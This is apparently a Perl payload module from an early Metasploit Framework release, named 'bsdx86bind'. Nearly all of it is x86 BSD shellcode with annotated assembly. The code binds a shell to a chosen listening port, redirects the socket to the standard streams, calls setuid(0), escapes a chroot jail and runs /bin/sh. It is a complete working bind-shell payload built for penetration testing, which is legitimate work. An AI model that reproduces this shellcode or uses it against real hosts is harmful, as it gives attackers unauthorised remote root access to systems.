package Msf::Payload::bsdx86_bind;
use strict;
use base 'Msf::Payload';

my $info =
{
    Name         => 'bsdx86bind',
    Version      => '1.0',
    Description  => 'Listen for connection and spawn a shell',
    Author       => 'LSD [Unknown License]',
    Arch         => [ 'x86' ],
    Priv         => 0,
    OS           => [ 'bsd' ],
    Multistage   => 0,
    Type         => 'bind_shell',
    Size         => '',
    UserOpts     =>
        {
            'LPORT' => [1, 'PORT', 'Local port to receive connection'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub Build {
    my $self = shift;
    return($self->Generate($self->GetVar('LPORT')));
}

sub Generate
{
    my $self = shift;
    my $port = shift;
    my $off_port = 11;
    my $port_bin = pack("n", $port);

    my $shellcode = # lsd bsd bind shell
    # clear some stack space
    "\x81\xec\x00\x02\x00\x00" . # sub esp, 512

    # char bindsckcode[]=    # /* 70 bytes                       */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\x68\xff\x02\x12\x34" . # /* pushl   $0x341202ff            */
    "\x89\xe7"             . # /* movl    %esp,%edi              */
    "\x50"                 . # /* pushl   %eax                   */
    "\x6a\x01"             . # /* pushl   $0x01                  */
    "\x6a\x02"             . # /* pushl   $0x02                  */
    "\xb0\x61"             . # /* movb    $0x61,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x8b\xd8"             . # /* movl    %eax,%ebx              */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\x89\x47\x04"         . # /* movl    %eax,0x4(%edi)         */
    "\x6a\x10"             . # /* pushb   $0x10                  */
    "\x57"                 . # /* pushl   %edi                   */
    "\x53"                 . # /* pushl   %ebx                   */
    "\xb0\x68"             . # /* movb    $0x68,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x6a\x05"             . # /* pushb   $0x05                  */
    "\x53"                 . # /* pushl   %ebx                   */
    "\xb0\x6a"             . # /* movb    $0x6a,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\x50"                 . # /* pushl   %eax                   */
    "\x50"                 . # /* pushl   %eax                   */
    "\x53"                 . # /* pushl   %ebx                   */
    "\xb0\x1e"             . # /* movb    $0x1e,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x50"                 . # /* pushl   %eax                   */
    "\x50"                 . # /* pushl   %eax                   */
    "\x91"                 . # /* xchgl   %ecx,%eax              */
    "\xb1\x03"             . # /* movb    $0x03,%cl              */
    "\x49"                 . # /* decl    %ecx                   */
    "\x89\x4c\x24\x08"     . # /* movl    %ecx,0x8(%esp)         */ 
    "\x41"                 . # /* incl    %ecx                   */
    "\xb0\x5a"             . # /* movb    $0x5a,%al              */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\xe2\xf4"             . # /* loop    <bindsckcode+58>       */

    # char setuidcode[]=     # /* 7 bytes                        */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xb0\x17"             . # /* movb    $0x17,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */

    # char chrootcode[]=     # /* 44 bytes                       */
    "\x68b..."             . # /* pushl   $0x2e2e2e62            */
    "\x89\xe7"             . # /* movl    %esp,%edi              */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\x88\x47\x03"         . # /* movb    %al,0x3(%edi)          */
    "\x57"                 . # /* pushl   %edi                   */
    "\xb0\x88"             . # /* movb    $0x88,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x57"                 . # /* pushl   %edi                   */
    "\xb0\x3d"             . # /* movb    $0x3d,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x47"                 . # /* incl    %edi                   */
    "\x33\xc9"             . # /* xorl    %ecx,%ecx              */
    "\xb1\xff"             . # /* movb    $0xff,%cl              */
    "\x57"                 . # /* pushl   %edi                   */
    "\x50"                 . # /* pushl   %eax                   */
    "\xb0\x0c"             . # /* movb    $0x0c,%al              */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\xe2\xfa"             . # /* loop    <chrootcode+31>        */
    "\x47"                 . # /* incl    %edi                   */
    "\x57"                 . # /* pushl   %edi                   */
    "\xb0\x3d"             . # /* movb    $0x3d,%al              */
    "\x50"                 . # /* pushl   %eax                   */
    "\xcd\x80"             . # /* int     $0x80                  */

    # char shellcode[]=      # /* 23 bytes                       */
    "\x31\xc0"             . # /* xorl    %eax,%eax              */
    "\x50"                 . # /* pushl   %eax                   */
    "\x68//sh"             . # /* pushl   $0x68732f2f            */
    "\x68/bin"             . # /* pushl   $0x6e69622f            */
    "\x89\xe3"             . # /* movl    %esp,%ebx              */
    "\x50"                 . # /* pushl   %eax                   */
    "\x54"                 . # /* pushl   %esp                   */
    "\x53"                 . # /* pushl   %ebx                   */
    "\x50"                 . # /* pushl   %eax                   */
    "\xb0\x3b"             . # /* movb    $0x3b,%al              */
    "\xcd\x80"             ; # /* int     $0x80                  */

    substr($shellcode, $off_port, 2, $port_bin);
    return $shellcode;
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate('4444');
    return length($bin);
}
